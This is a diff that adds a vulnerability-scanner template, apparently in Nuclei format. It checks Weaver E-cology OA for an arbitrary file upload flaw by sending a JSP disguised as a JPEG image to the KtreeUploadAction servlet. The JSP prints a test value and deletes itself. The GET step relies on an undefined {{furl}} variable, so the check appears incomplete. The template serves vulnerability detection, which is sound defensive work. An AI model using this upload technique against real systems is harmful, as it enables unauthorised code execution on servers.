@@ -1,0 +1,38 @@
+id: yaml-poc-weaver-weaver_e_cology_oa-file_upload-CT-490587
+info:
+  name: Yaml Poc Weaver Weaver_E_Cology_Oa File_Upload Ct 490587
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-weaver-weaver_e_cology_oa-file_upload-CT-490587'
+  tags: fileupload
+  reference:
+  - https://mp.weixin.qq.com/s/3ip7-U8BsWgq3N4SP5xd4w
+http:
+- method: POST
+  path:
+  - /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image
+  body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
+    \ name=\"test\"; filename=\"{{randname}}.jsp\"\r\nContent-Type: image/jpeg\r\n\
+    \r\n<%out.print({{r1}} * {{r2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\
+    \n------WebKitFormBoundary{{rboundary}}--\r\n"
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - SUCCESS
+- method: GET
+  path:
+  - /{{furl}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
